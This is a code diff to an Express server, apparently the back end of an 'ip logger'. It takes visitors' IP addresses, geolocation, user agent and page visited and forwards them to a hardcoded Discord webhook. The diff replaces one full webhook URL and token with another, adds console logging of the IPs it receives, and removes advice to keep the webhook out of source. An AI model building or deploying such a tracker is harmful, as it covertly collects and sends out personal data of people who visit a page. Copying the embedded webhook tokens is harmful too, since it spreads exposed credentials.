@@ -8,13 +8,16 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 app.use(express.static('public')); // Serve your HTML file from 'public' folder
 
-// Your Discord webhook URL (store this in environment variables in production!)
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1457745725503963228/yhAkda2dNMvJGv1HB-IipptbneMFqmgVqZYxZrtbEi83zFj5g7O4aHfgr5epd0kMCLN3';
+// Your Discord webhook URL
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
 
 // Endpoint to handle IP logging
 app.post('/log-ip', async (req, res) => {
     try {
         const { ip, city, region, country, userAgent, timestamp, page } = req.body;
+        
+        // Log to console for debugging
+        console.log(`IP Received: ${ip} from ${city}, ${country}`);
         
         // Create Discord embed message
         const embed = {
@@ -56,21 +59,15 @@ app.post('/log-ip', async (req, res) => {
         // Send to Discord webhook
         await axios.post(DISCORD_WEBHOOK_URL, {
             embeds: [embed],
-            username: "ip logger",
+            username: "ip logger"
         });
 
         res.json({ success: true, message: "Logged successfully" });
         
     } catch (error) {
-        console.error('Error sending to Discord:', error);
+        console.error('Error sending to Discord:', error.message);
         res.status(500).json({ success: false, error: "Failed to log IP" });
     }
-});
-
-// Alternative: Direct frontend to Discord (not recommended due to exposing webhook)
-app.post('/log-ip-direct', async (req, res) => {
-    // This endpoint would proxy the request to hide your webhook URL
-    // Implementation similar to above
 });
 
 app.listen(PORT, () => {
